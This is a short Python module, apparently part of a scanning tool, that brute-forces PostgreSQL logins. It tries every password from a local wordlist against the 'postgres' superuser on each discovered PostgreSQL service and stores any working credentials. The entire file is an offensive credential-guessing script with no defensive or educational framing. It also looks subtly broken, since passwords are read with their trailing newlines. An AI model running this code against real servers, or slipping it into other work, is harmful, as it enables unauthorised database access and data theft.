from dataclasses import dataclass
from functools import cached_property

import psycopg2

from app.schemes import Service


@dataclass
class BrutePSQL:
    ip: str
    services: list[Service]

    @cached_property
    def passwords(self) -> list[str]:
        with open("passwords.txt") as f:
            return f.readlines()

    def _connect(self, password: str, port: int):
        psycopg2.connect(
            user="postgres",
            password=password,
            host=str(self.ip),
            port=str(port),
            database="postgres",
        ).cursor()

    def _brute_psql_password(self, service: Service):
        for password in self.passwords:
            try:
                self._connect(password, service.port)
            except Exception:
                pass
            else:
                service.meta = {
                    "login": "postgres",
                    "password": password,
                }
                break

    def brute(self) -> list[Service]:
        for service in self.services:
            if service.name == "postgresql":
                self._brute_psql_password(service)
        return self.services
